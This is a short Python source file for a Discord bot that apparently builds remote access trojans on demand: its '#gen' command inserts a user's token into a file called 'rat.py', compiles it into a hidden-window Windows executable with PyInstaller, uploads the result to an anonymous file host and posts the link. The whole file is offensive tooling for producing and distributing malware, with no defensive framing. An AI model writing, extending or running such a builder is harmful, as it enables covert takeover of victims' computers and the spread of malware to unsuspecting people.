from anonfile import AnonFile
import shutil
from pathlib2 import Path
import PyInstaller
import os
import discord
from discord.ext import commands
import time
from time import sleep
def upload(filepath):
    file_up = AnonFile()
    up = file_up.upload(filepath)
    return str(up.url.geturl())
def gen(token):
    src = r'rat.py'
    dest = 'hi.py'
    path = shutil.copyfile(src,dest)
    file = Path(r'hi.py')
    data = file.read_text()
    sr = '#Enteer'
    data = data.replace(sr,token)
    file.write_text(data)
    os.system("python -m PyInstaller --onefile --windowed --hidden-import=discord hi.py")
    print(upload(r'dist/hi.exe'))
    return upload(r'dist/hi.exe')
bot = commands.Bot(command_prefix="#",intents=discord.Intents.all())

@bot.command(name="gen")
async def generate_token(ctx, tkn: str):
    x = gen(tkn)
    await ctx.send(x)

if __name__ == "__main__":
    bot.run("tkn")
